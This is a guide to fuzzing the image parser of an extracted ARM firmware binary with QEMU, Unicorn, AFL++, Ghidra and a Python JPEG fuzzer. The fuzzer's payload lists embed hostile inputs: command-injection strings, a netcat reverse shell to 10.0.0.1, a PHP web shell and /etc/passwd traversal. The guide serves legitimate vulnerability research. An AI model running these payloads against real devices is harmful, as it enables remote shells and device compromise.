# DTM-600 Local Fuzzing Setup

**Target:** ARM 32-bit binaries from extracted firmware
**Goal:** Fuzz image parsing without hitting live device

---

## 1. Quick Reference

```
Binary:     mwareserver (ARM 32-bit ELF, dynamically linked)
Arch:       ARM EABI5, little-endian
Libc:       glibc 2.24
Root:       dtm-600/program_factory/
```

---

## 2. Option A: QEMU User-Mode (Simplest)

### Install QEMU
```bash
# macOS
brew install qemu

# Linux
sudo apt install qemu-user qemu-user-static
```

### Run ARM Binary Directly
```bash
cd <RELEASE_ROOT>/dtm-600/program_factory

# Set library path and run
QEMU_LD_PREFIX=. qemu-arm-static ./bin/mwareserver --help

# Or with explicit interpreter
qemu-arm -L . ./bin/mwareserver
```

### Create Fuzzing Wrapper
```bash
#!/bin/bash
# fuzz_wrapper.sh - Wrapper for AFL/fuzzing

ROOT="<RELEASE_ROOT>/dtm-600/program_factory"

# Run target with QEMU, passing fuzzed input
QEMU_LD_PREFIX="$ROOT" qemu-arm-static \
    "$ROOT/bin/mwareserver" \
    --parse-image "$1"  # hypothetical CLI flag
```

---

## 3. Option B: Extract & Fuzz Specific Functions

More efficient - just fuzz the image parsing code, not the whole binary.

### Step 1: Identify Target Functions

From our analysis:
```
BP_ACS_IsJpegFile()      - JPEG validation
BP_PACS_ParseImage()     - Image parsing
IMOS_Base64Decode()      - Base64 decoding
cJSON_Parse()            - JSON parsing
```

### Step 2: Extract Function with Ghidra

```python
# In Ghidra Python console:
# Export BP_PACS_ParseImage as standalone

func = getFunction("BP_PACS_ParseImage")
if func:
    start = func.getEntryPoint()
    end = func.getBody().getMaxAddress()
    print(f"Function: {start} - {end}")

    # Get bytes
    mem = currentProgram.getMemory()
    code_bytes = bytes([mem.getByte(start.add(i)) for i in range(func.getBody().getNumAddresses())])
```

### Step 3: Create Harness with Unicorn

```python
#!/usr/bin/env python3
"""
Unicorn-based harness for fuzzing BP_PACS_ParseImage
"""

from unicorn import *
from unicorn.arm_const import *
import struct

# Load binary
with open('dtm-600/program_factory/bin/mwareserver', 'rb') as f:
    binary = f.read()

# Initialize emulator
mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)

# Map memory
BASE = 0x10000
STACK = 0x80000000
HEAP = 0x90000000

mu.mem_map(BASE, 16 * 1024 * 1024)  # Code/data
mu.mem_map(STACK - 0x10000, 0x10000)  # Stack
mu.mem_map(HEAP, 0x1000000)  # Heap for image data

# Load binary (simplified - would need ELF parsing)
mu.mem_write(BASE, binary)

# Set up stack
mu.reg_write(UC_ARM_REG_SP, STACK - 0x100)

def fuzz_parse_image(image_data):
    """
    Fuzz the image parsing function

    Args:
        image_data: Raw bytes of (potentially malformed) JPEG
    """
    # Write image data to heap
    mu.mem_write(HEAP, image_data)

    # Set up function arguments (ARM calling convention)
    # R0 = pointer to image data
    # R1 = image data length
    mu.reg_write(UC_ARM_REG_R0, HEAP)
    mu.reg_write(UC_ARM_REG_R1, len(image_data))

    # Set return address to trigger stop
    mu.reg_write(UC_ARM_REG_LR, 0xDEADBEEF)

    # Hook for detecting crashes
    def hook_mem_invalid(uc, access, address, size, value, user_data):
        print(f"CRASH: Invalid memory access at {hex(address)}")
        return False

    mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED,
                hook_mem_invalid)

    # Address of BP_PACS_ParseImage (find with Ghidra)
    FUNC_ADDR = 0x12345678  # REPLACE WITH REAL ADDRESS

    try:
        mu.emu_start(FUNC_ADDR, 0xDEADBEEF, timeout=1000000)
        return "OK"
    except UcError as e:
        return f"CRASH: {e}"

# Fuzzing loop
if __name__ == "__main__":
    import sys

    with open(sys.argv[1], 'rb') as f:
        data = f.read()

    result = fuzz_parse_image(data)
    print(result)

    if "CRASH" in result:
        sys.exit(1)
```

---

## 4. Option C: AFL++ with QEMU Mode

Best for coverage-guided fuzzing.

### Setup
```bash
# Install AFL++ with QEMU support
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
cd qemu_mode
./build_qemu_support.sh

# Or on Linux:
sudo apt install afl++ afl++-qemu
```

### Create Test Harness

Since mwareserver is a daemon, we need a simpler harness.
Extract just the image parsing into a test program:

```c
// harness.c - Compile for ARM with cross-compiler
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Declarations for functions we'll call from mwareserver
extern int BP_PACS_ParseImage(void* data, int len, void* output);
extern int BP_ACS_IsJpegFile(void* data, int len);

int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <image_file>\n", argv[0]);
        return 1;
    }

    // Read input file
    FILE* f = fopen(argv[1], "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);

    void* data = malloc(len);
    fread(data, 1, len, f);
    fclose(f);

    // First check if valid JPEG
    int is_jpeg = BP_ACS_IsJpegFile(data, len);
    printf("IsJpeg: %d\n", is_jpeg);

    // Parse the image
    char output[4096] = {0};
    int result = BP_PACS_ParseImage(data, len, output);
    printf("ParseResult: %d\n", result);

    free(data);
    return 0;
}
```

### Cross-compile
```bash
# Install ARM cross-compiler
# macOS:
brew install arm-linux-gnueabihf-binutils

# Linux:
sudo apt install gcc-arm-linux-gnueabihf

# Compile harness
arm-linux-gnueabihf-gcc -static harness.c -o harness_arm \
    -L dtm-600/program_factory/lib \
    -Wl,-rpath,dtm-600/program_factory/lib
```

### Run AFL++
```bash
# Create seed corpus
mkdir -p corpus
cp some_valid_face.jpg corpus/

# Run AFL++ with QEMU mode
AFL_QEMU_PERSISTENT_ADDR=0x... \
AFL_ENTRYPOINT=0x... \
afl-fuzz -Q -i corpus -o findings -- ./harness_arm @@
```

---

## 5. Option D: Python-based JPEG Parser Fuzzer (Fastest to Implement)

Don't even run the binary - just fuzz the JPEG parsing logic we can infer.

```python
#!/usr/bin/env python3
"""
jpeg_fuzzer.py - Fuzz JPEG structures that might break the parser

Based on observed behavior:
- Checks for FF D8 FF (SOI + APP marker)
- Reads dimensions from SOF marker
- Allocates width * height * 3 buffer
"""

import struct
import random
import os

class JPEGFuzzer:
    def __init__(self):
        self.markers = {
            'SOI': b'\xFF\xD8',
            'EOI': b'\xFF\xD9',
            'APP0': b'\xFF\xE0',
            'APP1': b'\xFF\xE1',  # EXIF
            'DQT': b'\xFF\xDB',
            'SOF0': b'\xFF\xC0',
            'SOF2': b'\xFF\xC2',
            'DHT': b'\xFF\xC4',
            'SOS': b'\xFF\xDA',
            'COM': b'\xFF\xFE',
        }

    def create_minimal_jpeg(self, width=100, height=100):
        """Create minimal valid JPEG structure"""
        jpeg = bytearray()

        # SOI
        jpeg += self.markers['SOI']

        # APP0 (JFIF)
        jpeg += self.markers['APP0']
        jpeg += b'\x00\x10'  # Length
        jpeg += b'JFIF\x00'
        jpeg += b'\x01\x01'  # Version
        jpeg += b'\x00'      # Units
        jpeg += b'\x00\x01\x00\x01'  # Density
        jpeg += b'\x00\x00'  # Thumbnail

        # DQT
        jpeg += self.markers['DQT']
        jpeg += b'\x00\x43\x00'
        jpeg += bytes([16] * 64)

        # SOF0
        jpeg += self.markers['SOF0']
        jpeg += b'\x00\x11'  # Length
        jpeg += b'\x08'      # Precision
        jpeg += struct.pack('>HH', height, width)
        jpeg += b'\x03'      # Components
        jpeg += b'\x01\x11\x00'  # Y
        jpeg += b'\x02\x11\x01'  # Cb
        jpeg += b'\x03\x11\x01'  # Cr

        # DHT
        jpeg += self.markers['DHT']
        jpeg += b'\x00\x1F\x00'
        jpeg += b'\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
        jpeg += bytes(range(12))

        # SOS
        jpeg += self.markers['SOS']
        jpeg += b'\x00\x0C\x03'
        jpeg += b'\x01\x00\x02\x11\x03\x11'
        jpeg += b'\x00\x3F\x00'

        # Minimal scan data
        jpeg += b'\x00' * 10

        # EOI
        jpeg += self.markers['EOI']

        return bytes(jpeg)

    def fuzz_dimensions(self):
        """Generate JPEGs with various dimension edge cases"""
        cases = [
            (0, 0),           # Zero dimensions
            (1, 1),           # Minimal
            (65535, 65535),   # Maximum
            (65535, 1),       # Wide
            (1, 65535),       # Tall
            (0x7FFF, 0x7FFF), # Max signed short
            (0x8000, 0x8000), # Overflow boundary
            (46341, 46341),   # sqrt(2^31) - overflow when squared
        ]

        for w, h in cases:
            yield self.create_minimal_jpeg(w, h), f"dim_{w}x{h}"

    def fuzz_markers(self):
        """Generate JPEGs with malformed markers"""
        base = self.create_minimal_jpeg()

        # Missing SOI
        yield base[2:], "no_soi"

        # Double SOI
        yield base[:2] + base, "double_soi"

        # No EOI
        yield base[:-2], "no_eoi"

        # Random marker in middle
        mid = len(base) // 2
        yield base[:mid] + b'\xFF\xFF' + base[mid:], "invalid_marker"

        # Truncated at various points
        for i in [10, 50, 100, len(base)//2]:
            yield base[:i], f"truncated_{i}"

    def fuzz_lengths(self):
        """Generate JPEGs with malformed length fields"""
        base = bytearray(self.create_minimal_jpeg())

        # Find APP0 and corrupt length
        app0_pos = bytes(base).find(b'\xFF\xE0')
        if app0_pos > 0:
            # Zero length
            test = bytearray(base)
            test[app0_pos+2:app0_pos+4] = b'\x00\x00'
            yield bytes(test), "app0_zero_len"

            # Huge length
            test = bytearray(base)
            test[app0_pos+2:app0_pos+4] = b'\xFF\xFF'
            yield bytes(test), "app0_huge_len"

            # Length 2 (minimum)
            test = bytearray(base)
            test[app0_pos+2:app0_pos+4] = b'\x00\x02'
            yield bytes(test), "app0_min_len"

    def fuzz_exif(self):
        """Generate JPEGs with various EXIF payloads"""
        payloads = [
            b'$(id)',
            b'`whoami`',
            b"'; ls -la /; '",
            b'<script>alert(1)</script>',
            b'A' * 10000,
            b'A' * 65535,
            b'\x00' * 100,
            b'../../../etc/passwd',
        ]

        for payload in payloads:
            jpeg = bytearray(self.create_minimal_jpeg())

            # Insert EXIF marker after SOI
            exif = bytearray()
            exif += self.markers['APP1']
            exif_data = b'Exif\x00\x00II\x2A\x00\x08\x00\x00\x00'
            exif_data += b'\x01\x00'  # 1 entry
            exif_data += b'\x0E\x01'  # ImageDescription tag
            exif_data += b'\x02\x00'  # ASCII type
            exif_data += struct.pack('<I', len(payload))
            exif_data += struct.pack('<I', 26)  # Offset
            exif_data += b'\x00\x00\x00\x00'  # Next IFD
            exif_data += payload

            exif += struct.pack('>H', len(exif_data) + 2)
            exif += exif_data

            # Insert after SOI
            result = bytes(jpeg[:2]) + bytes(exif) + bytes(jpeg[2:])
            yield result, f"exif_{payload[:10].hex()}"

    def fuzz_comment(self):
        """Generate JPEGs with various comment payloads"""
        payloads = [
            b'$(reboot)',
            b'`nc 10.0.0.1 4444 -e /bin/sh`',
            b'\x00\x00\x00\x00',
            b'\xFF' * 1000,
            b'A' * 65533,  # Max comment size
        ]

        for payload in payloads:
            jpeg = bytearray(self.create_minimal_jpeg())

            # Insert comment after SOI
            comment = self.markers['COM']
            comment += struct.pack('>H', len(payload) + 2)
            comment += payload

            result = bytes(jpeg[:2]) + comment + bytes(jpeg[2:])
            yield result, f"comment_{len(payload)}"

    def fuzz_appended_data(self):
        """Generate JPEGs with data after EOI"""
        base = self.create_minimal_jpeg()

        payloads = [
            b'#!/bin/sh\nid > /tmp/pwned\n',
            b'<?php system($_GET["c"]); ?>',
            b'PK\x03\x04',  # ZIP header
            struct.pack('<256f', *([0.5]*256)),  # Feature vector
        ]

        for payload in payloads:
            yield base + payload, f"appended_{payload[:4].hex()}"

    def generate_all(self, output_dir):
        """Generate all fuzz cases to directory"""
        os.makedirs(output_dir, exist_ok=True)

        generators = [
            self.fuzz_dimensions(),
            self.fuzz_markers(),
            self.fuzz_lengths(),
            self.fuzz_exif(),
            self.fuzz_comment(),
            self.fuzz_appended_data(),
        ]

        count = 0
        for gen in generators:
            for data, name in gen:
                path = os.path.join(output_dir, f"{name}.jpg")
                with open(path, 'wb') as f:
                    f.write(data)
                count += 1
                print(f"Generated: {name} ({len(data)} bytes)")

        print(f"\nTotal: {count} test cases in {output_dir}/")

if __name__ == "__main__":
    fuzzer = JPEGFuzzer()
    fuzzer.generate_all("fuzz_corpus")
```

---

## 6. Option E: Direct Binary Analysis (No Emulation)

Use Ghidra to understand the parsing, then write targeted test cases.

### Find Key Functions in Ghidra

```python
# Ghidra script to find image parsing functions
from ghidra.app.decompiler import DecompInterface

decomp = DecompInterface()
decomp.openProgram(currentProgram)

targets = [
    "BP_PACS_ParseImage",
    "BP_ACS_IsJpegFile",
    "IMOS_Base64Decode",
]

for name in targets:
    funcs = getGlobalFunctions(name)
    for func in funcs:
        print(f"\n{'='*60}")
        print(f"Function: {name}")
        print(f"Address: {func.getEntryPoint()}")

        # Decompile
        result = decomp.decompileFunction(func, 60, None)
        if result.decompileCompleted():
            print(result.getDecompiledFunction().getC())
```

### Key Things to Look For

1. **Buffer allocation size calculation**
   - Look for: `malloc(width * height * 3)`
   - Check for integer overflow

2. **Length validation**
   - Is length checked before memcpy?
   - Are marker lengths validated?

3. **EXIF handling**
   - Is EXIF data parsed?
   - Are strings copied without length check?

4. **Error handling**
   - What happens on invalid input?
   - Are allocated buffers freed on error?

---

## 7. Recommended Approach (Priority Order)

1. **Python JPEG fuzzer** (Option D) - Generates corpus, no setup
2. **Ghidra analysis** (Option E) - Understand exact vulnerabilities
3. **QEMU + AFL++** (Option C) - Coverage-guided fuzzing
4. **Unicorn harness** (Option B) - Targeted function fuzzing

### Quick Start
```bash
# 1. Generate fuzz corpus
cd <RELEASE_ROOT>/dtm-600
python3 ../NOTES/jpeg_fuzzer.py  # Creates fuzz_corpus/

# 2. Test on device (or emulated)
for f in fuzz_corpus/*.jpg; do
    echo "Testing: $f"
    # Either upload to device or run in QEMU
done
```

---

## 8. What to Look For (Crash Indicators)

When fuzzing locally with QEMU or Unicorn:

```
SIGSEGV  - Memory access violation (buffer overflow likely)
SIGBUS   - Bus error (alignment issue)
SIGABRT  - Assertion failed (may indicate logic bug)
SIGFPE   - Floating point exception (division by zero)
Timeout  - Infinite loop (DoS)
OOM      - Out of memory (decompression bomb)
```

When testing against real device:
```bash
# Monitor on device
watch -n1 'ps | grep -c mwareserver'  # Process alive?
dmesg | tail                           # Kernel messages
cat /proc/meminfo | grep MemFree      # Memory exhaustion
```
